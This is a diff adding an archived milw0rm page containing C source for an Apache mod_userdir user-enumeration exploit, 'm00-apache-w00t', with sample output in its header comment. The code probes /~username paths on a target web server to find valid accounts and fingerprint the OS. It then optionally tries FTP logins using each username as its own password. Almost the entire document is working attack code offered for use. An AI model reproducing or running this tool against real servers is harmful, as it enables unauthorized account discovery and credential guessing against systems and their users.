@@ -1,0 +1,308 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+/* m00-apache-w00t.c
+*
+* Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.
+* ~ Proof-of-Concept edition ~
+*
+* This tool scans remote hosts with httpd (apache) and disclosure information
+* about existens users accounts via wrong default configuration of mod_userdir
+* (default apache module). Then attempts to log on ftp with found logins.
+*
+* Works only against Linux and *BSD boxes.
+* Info: http://archives.neohapsis.com/archives/vuln-dev/2000-q3/0065.html
+* This is old, but curentlly still actual problem, because 99% of all admins use
+* default configuration of apache http server.
+*
+* This tool scans remote hosts with httpd (apache) and disclosure information 
+* about existens users accounts via wrong default configuration of mod_userdir 
+* (default apache module). Then attempts to log on ftp with found logins.
+* 
+* -d4rkgr3y
+*
+* sh-2.05b$ ./m00-apache-w00t -t localhost -u test_userlist.txt -b
+* 
+* [*] Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.
+* 
+* [*] Checking http server [localhost:80]...
+* Apache =&gt; yes
+* Vulnerable =&gt; yes
+* OS =&gt; Mandrake Linux
+* [*] Searching for system accounts...
+* sergey =&gt;
+* m00 =&gt;
+* satan =&gt; yes
+* evil =&gt;
+* poison =&gt;
+* god =&gt;
+* guest =&gt;
+* dima =&gt;
+* ftp =&gt; yes
+* vasya =&gt;
+* rst =&gt;
+* vasi =&gt;
+* [*] Searching complete.
+* 12 users checked
+* 2 users found
+* [*] Attempting to log on ftp with login:login...
+* satan:satan =&gt; no
+* ftp:ftp =&gt; no
+* [*] Complete.
+* 0 ftp accounts found
+* 
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+
+#define DEFAULT_HTTP_PORT 80
+#define DEFAULT_FTP_PORT 21
+
+int m00() {
+printf(&quot;\n[*] Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.\n\n&quot;);
+printf(&quot;\n[*] Downloaded on www.K-OTIK.com\n\n&quot;);
+}
+
+int verbose(char *d) {
+printf(&quot;+-----------------------o0o-----------------------+\n&quot;);
+printf(&quot;\n%s&quot;,d);
+printf(&quot;+-----------------------o0o-----------------------+\n&quot;);
+}
+
+int usage(char *xplname) {
+printf(&quot;[~] usage: %s -t &lt;host&gt; -u &lt;userlist&gt; [options]\n\n&quot;,xplname);
+printf(&quot;Options:\n&quot;);
+printf(&quot;-p &lt;port&gt; - http port [80]\n&quot;);
+printf(&quot;-l &lt;log_file&gt; - log all attempts to file\n&quot;);
+printf(&quot;-b - try to log on ftp with guessed logins (public version only login:login)\n&quot;);
+printf(&quot;-h - usage\n&quot;);
+printf(&quot;\n&quot;);
+exit(0);
+}
+
+int attempt(char *argv);
+
+int conn(char *ip, unsigned short port) {
+struct hostent *hs;
+struct sockaddr_in sock;
+int sockfd;
+bzero(&amp;sock, sizeof(sock));
+sock.sin_family = AF_INET;
+sock.sin_port = htons(port);
+if ((sock.sin_addr.s_addr=inet_addr(ip))==-1) {
+if ((hs=gethostbyname(ip))==NULL) {
+perror(&quot;[-] Error&quot;); exit(0);
+}
+sock.sin_family = hs-&gt;h_addrtype;
+memcpy((caddr_t)&amp;sock.sin_addr.s_addr,hs-&gt;h_addr,hs-&gt;h_length);
+}
+if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0){
+perror(&quot;[-] Error&quot;); exit(0);
+}
+if(connect(sockfd, (struct sockaddr *)&amp;sock, sizeof(sock)) &lt; 0){
+perror(&quot;[-] Error &quot;); exit(0);
+}
+return(sockfd);
+}
+
+
+int main(int argc, char *argv[]) {
+FILE *userlist, *logfile;
+char *file=NULL;
+char *lfile=NULL;
+char *host=NULL;
+char buf[0x20], check[0x20], request[0xc8], answer[0x3e8], c,logd[0x30];
+int i,hand,x,f,v=0,brute=0;
+int port = DEFAULT_HTTP_PORT;
+int fport = DEFAULT_FTP_PORT;
+
+char c200[0x05] =
+&quot;\x20\x32\x30\x30\x20&quot;;
+char c403[0x0e] =
+&quot;\x34\x30\x33\x20\x46\x6f&quot;
+&quot;\x72\x62\x69\x64\x64\x65\x6e&quot;;
+char c404[0x0e] =
+&quot;\x34\x30\x34\x20\x4e\x6f\x74&quot;
+&quot;\x20\x46\x6f\x75\x6e\x64&quot;;
+char signature[0x0f] =
+&quot;\x53\x65\x72\x76\x65\x72\x3a&quot;
+&quot;\x20\x41\x70\x61\x63\x68\x65&quot;;
+char *http =
+&quot;Accept: */*\r\n&quot;
+&quot;Accept-Language: en-us,en;q=0.5\r\n&quot;
+&quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;
+&quot;User-Agent: m00-apache-finger\r\n&quot;
+&quot;Connection: close\r\n\r\n&quot;;
+char **logz;
+
+m00();
+
+if(argc&lt;2) usage(argv[0]);
+while((c = getopt(argc, argv, &quot;t:u:hp:vbl:&quot;))!= EOF) {
+switch (c) {
+case 't':
+host=optarg;
+break;
+case 'u':
+file=optarg;
+break;
+case 'p':
+port=atoi(optarg);
+break;
+case 'l':
+lfile=optarg;
+break;
+case 'b':
+brute=1;
+break;
+case 'v':
+v=1;
+break;
+case 'h':
+usage(argv[0]);
+return 1;
+default:
+usage(argv[0]);
+return 1;
+}
+}
+
+if(host==NULL) { usage(argv[0]); }
+if(file==NULL) { usage(argv[0]); }
+
+if(lfile &amp;&amp; (logfile = fopen(lfile, &quot;a&quot;)) == 0) {
+printf(&quot;[-] unable to open logfile [%s]\n&quot;,lfile);
+exit(0);
+}
+
+if((userlist = fopen(file, &quot;r&quot;)) == 0) {
+printf(&quot;[-] unable to open userlist [%s]\n&quot;,file);
+exit(0);
+}
+
+logz = (char **)malloc(0x666);
+
+printf(&quot;[*] Checking http server [%s:%i]...\n&quot;,host,port);
+
+hand = conn(host,port);
+sprintf(request,&quot;HEAD /~root HTTP/1.1\r\nHost: %s\r\n%s&quot;,host,http);
+
+write(hand,request,strlen(request));
+recv(hand,answer,0x3e8,0);
+
+if(v) verbose(answer);
+
+printf(&quot; Apache =&gt; &quot;);
+if(!strstr(answer,signature)) { printf(&quot; no\n Vulnerable =&gt; &quot;); } else printf(&quot; yes\n Vulnerable =&gt; &quot;);
+if(!strstr(answer,c403)) { printf(&quot;no\n[-] Exiting...\n&quot;); exit(0); } else printf(&quot;yes\n&quot;);
+close(hand);
+
+hand = conn(host,port);
+sprintf(request,&quot;HEAD /~toor HTTP/1.1\r\nHost: %s\r\n%s&quot;,host,http);
+write(hand,request,strlen(request));
+recv(hand,answer,0x3e8,0);
+
+if(v) verbose(answer);
+
+printf(&quot; OS =&gt; &quot;);
+if(strstr(answer,c403)) { printf(&quot;FreeBSD&quot;); } else {
+if(strstr(answer,&quot;Unix&quot;)) printf(&quot;Unix unknow&quot;);
+if(strstr(answer,&quot;Debian&quot;)) printf(&quot;Debian Linux&quot;);
+if(strstr(answer,&quot;RedHat&quot;)) printf(&quot;RedHat Linux&quot;);
+if(strstr(answer,&quot;mdk&quot;)) printf(&quot;Mandrake Linux&quot;);
+}
+close(hand);
+
+printf(&quot;\n[*] Searching for system accounts...&quot;);
+
+if(lfile) {
+sprintf(logd,&quot;Host: %s\nFound accounts:\n&quot;,host);
+fprintf(logfile,logd);
+}
+
+x=0;
+f=0;
+while (1) {
+fgets(buf, 32, userlist);
+if (buf[0] == '\n' || strstr(check,buf)) break;
+strcpy(check,buf);
+buf[strlen(buf)-1] = '\0';
+x++;
+
+printf(&quot;\n %s \t=&gt; &quot;,buf);
+
+
+hand = conn(host,port);
+sprintf(request,&quot;HEAD /~%s HTTP/1.1\r\nHost: %s\r\n%s&quot;,buf,host,http);
+
+write(hand,request,strlen(request));
+recv(hand,answer,0x3e8,0);
+
+if(v) verbose(answer);
+
+if(!strstr(answer,c404)) {
+printf(&quot; yes&quot;,buf);
+if(lfile) {
+sprintf(logd,&quot;%s\n&quot;,buf);
+fprintf(logfile,logd);
+}
+logz[f] = (char *)malloc(strlen(buf));
+memcpy(logz[f],buf,strlen(buf));
+memset(logz[f]+strlen(buf),0x0,1);
+f++;
+}
+close(hand);
+}
+fclose(userlist);
+printf(&quot;\n[*] Searching complete.\n&quot;);
+printf(&quot; %i users checked\n %i users found\n&quot;,x,f);
+if(brute &amp;&amp; f&gt;0) {
+x=0;
+i=0;
+if(lfile) {
+sprintf(logd,&quot;FTP:\n&quot;);
+fprintf(logfile,logd);
+}
+printf(&quot;[*] Attempting to log on ftp with login:login...\n&quot;);
+while(x!=f) {
+printf(&quot; %s:%s \t=&gt;&quot;,logz[x],logz[x]);
+hand = conn(host,fport);
+
+sprintf(request,&quot;USER %s\n&quot;,logz[x]);
+write(hand,request,strlen(request));
+recv(hand,answer,0x3e8,0);
+
+sprintf(request,&quot;PASS %s\n&quot;,logz[x]);
+write(hand,request,strlen(request));
+recv(hand,answer,0x3e8,0);
+if(strstr(answer,&quot;230&quot;)) {
+printf(&quot; yes\n&quot;);
+if(lfile) {
+sprintf(logd,&quot;%s:%s\n&quot;,logz[x],logz[x]);
+fprintf(logfile,logd);
+}
+i++;
+} else printf(&quot; no\n&quot;);
+close(hand);
+x++;
+}
+printf(&quot;[*] Complete.\n&quot;);
+printf(&quot; %i ftp accounts found\n&quot;,i);
+}
+if(lfile) {
+fprintf(logfile,&quot;\n&quot;);
+fclose(logfile);
+}
+
+}
+/* m00 */</pre>
+//downloaded from milw0rm.com
+</html>
